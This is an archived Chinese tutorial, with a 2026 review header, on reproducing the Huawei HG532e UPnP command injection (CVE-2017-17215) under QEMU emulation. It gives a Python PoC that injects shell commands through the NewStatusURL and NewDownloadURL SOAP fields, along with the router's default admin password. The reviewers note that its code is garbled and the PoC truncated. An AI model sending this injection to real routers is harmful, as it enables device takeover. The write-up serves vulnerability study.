---
source: "MrWQ/vulnerability-paper"
id: "vw-8a85b1aabada300aefb6fb65"
entity_id: "ve-8a85b1aabada300aefb6fb65"
schema_version: "1"
title: "Qemu模拟固件复现分析华为HG532e系列路由器漏洞"
product: "Huawei HG532e"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2017-17215"
referenced_identifiers: ""
prerequisites: "HG532eV100R001C01B020，QEMU MIPS，37215 UPnP；认证细节缺失"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Huawei/Qemu%E6%A8%A1%E6%8B%9F%E5%9B%BA%E4%BB%B6%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E5%8D%8E%E4%B8%BAHG532e%E7%B3%BB%E5%88%97%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://mp.weixin.qq.com/s/As40BU6FlrU_YwRoloL5jg"
source_status: "recorded"
---

# Qemu模拟固件复现分析华为HG532e系列路由器漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Huawei HG532e
- 本文讨论：DeviceUpgrade_1 NewStatusURL/NewDownloadURL命令注入；与CVE-2017-17215文章关联
- 版本、权限与配置前提：HG532eV100R001C01B020，QEMU MIPS，37215 UPnP；认证细节缺失
- 资料类型：仿真/逆向教程；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 多个shell命令与Python折叠粘连；Authorization值从Digest user处截断，PoC不能直接解析
- snprintf/system根因文字明确，但摘要认证/硬编码凭据条件未说明
- HG532e系列不是固件影响范围；参考Checkpoint未给原报告链接

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 真实设备与仿真鉴权一致性、版本范围待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/As40BU6FlrU_YwRoloL5jg)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

漏洞描述
====

华为HG532产品存在远程命令执行漏洞，华为HG532 系列路由器是一款为家庭和小型办公用户打造的高速无线路由器产品，没有对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造的语句提交，让服务器端执行。

受影响版本
=====

HG532e系列

环境搭建
====

解压固件
----

通过如下地址下载固件  
https://ia801309.us.archive.org/15/items/RouterHG532e/router%20HG532e.rar  
先解压出来rar文件，然后使用binwalk解压固件，得到文件系统

  

```


`binwalk -Me HG532eV100R001C01B020_upgrade_packet.bin`


```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWGxZ51UQulp422nRSSEbOtNXYcwtGYzfAtRk3wFkYHy6iba8ThAGtTIKkZr0Ob99icdXTwovuCFFAg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

解压出来的文件内容如下:  

  
![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWGxZ51UQulp422nRSSEbOt9de0flpFmXtP3S0kwEYUCX2Plj1zP4gaNaEJx0b5oaHXicasoicOyJdQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

此处的squashfs-root文件夹需要在后面上传到qemu虚拟机中

搭建虚拟机
-----

下载qemu

```


`sudo apt-get install qemu``sudo apt-get install qemu binfmt-support qemu-user-static`


```

  

  

下载qemu启动虚拟机所需要的“镜像”

```


`wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2` `wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta`


```

  

  

创建虚拟网桥，实现虚拟机内部和Ubuntu的连接

```


`sudo apt-get install bridge-utils``sudo brctl addbr Virbr0``sudo ifconfig Virbr0 192.168.50.51/24 up`


```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWGxZ51UQulp422nRSSEbOtcm9QyjdWnQr3jUkvj6Tq2oYzWDaPGG8KbBiciaBMJ6eGVLBTuvuB1ZNA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

创建tap接口，名字为tap0，并添加到网桥:  

  

```


`sudo tunctl -t tap0``sudo ifconfig tap0 192.168.50.52/24 up``sudo brctl addif Virbr0 tap0`


```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWGxZ51UQulp422nRSSEbOt6iaNrJ4qJnicmDVcG8IvHE23D2KGJnouO7WSlIXKicGLgQpZD4HVmdiaWg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

使用命令启动虚拟机:  

```


`sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic`


```

  



  

在启动的虚拟机里面添加一个IP，并尝试ping外界:

```


`ifconfig eth0 192.168.50.53/24 up`


```

  



  

将之前解压出来的squashfs-root文件夹通过scp命令，复制到虚拟机中:

```


`scp -r squashfs-root/ root@192.168.50.53:~/`


```

  





  

在虚拟机中挂载dev和proc

```


`mount -o bind /dev ./squashfs-root/dev mount -t proc /proc ./squashfs-root/proc`


```

  



  

启动shell:

```


`chroot squashfs-root sh`


```

  



  

这个终端是用来后面改IP地址的，这个时候在Ubuntu里面再单独开一个终端，使用ssh连接上去通过ssh启动的终端，启动路由器:

```


`ssh root@192.168.50.53 chroot squashfs-root /bin/sh ./bin/upnp ./bin/mic`


```

  

  

  

这个通过ssh连接的终端实际上已经无法使用了，因为虚拟机里面的路由器IP发生了变化，ssh连接已经断开，返回之前的虚拟机中的终端。  

  


  

需要重新更改路由器的IP，以便于外部的Ubuntu登录管理界面:

```


`ifconfig eth0 192.168.50.53/24 up ifconfig br0 192.168.50.52/24 up`


```

  

  

  

这个时候在Ubuntu上使用浏览器访问路由器eth0的IP地址，就可以登录进入管理界面，默认的账号密码是：admin，@Hua1234  

  


漏洞复现
====

使用poc进行命令注入

```


`import requests` `headers = {` `"Authorization": "Digest user``}``data = '''<?xml version="1.0" ?>` `<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">` `<s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">` `<NewStatusURL>;mkdir tide;</NewStatusURL>` `<NewDownloadURL>;mkdir xxlm;</NewDownloadURL>` `</u:Upgrade>` `</s:Body>``</s:Envelope>``'''``response = requests.post('http://192.168.50.53:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)``print(response.text)`


```

  



  

在上面的POC里面成功创建一个名为tide和xxlm的文件夹:  

  



漏洞分析
====

根据资料，漏洞出在 /bin/upnp  


  

定位到漏洞位置，首先找到system，右键找到相关调用位置。  

  


  

system的位置，来到FUN_0040749c这个函数:  

  



  

一个很典型的snprintf，system的配合。漏洞就出自这里。根据上面这个图，仔细看看，system 执行的参数是 acStack1040。而 acStack1040 从上一句 snprintf得到，其中的参数local_418，local_414。local_418 是由函数ATP_XML_GetChildNodeByName 取标签“NewDownloadURL”的值；local 是取标签“NewStatusURL”的值。那么，这2个标签是来自什么位置，怎么触发呢？根据参考Checkpoint的分析，UPnP支持名为“ DeviceUpgrade”的服务类型。该服务被认为是通过向“ / ctrlt / DeviceUpgrade_1”发送请求（称为controlURL）来执行固件升级操作的，并且是通过名为“ NewStatusURL”和“ NewDownloadURL”的两个元素来执行的

加固建议
====

及时更新最新固件。

  

E

N

D

  

  

**关**

**于**

**我**

**们**

Tide安全团队正式成立于2019年1月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web安全、移动终端、安全开发、物联网/工控安全/AI安全等多个领域。

团队作为“省级等保关键技术实验室”先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室。团队公众号自创建以来，共发布原创文章370余篇，自研平台达到26个，目有15个平台已开源。此外积极参加各类线上、线下CTF比赛并取得了优异的成绩。如有对安全行业感兴趣的小伙伴可以踊跃加入或关注我们。



---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
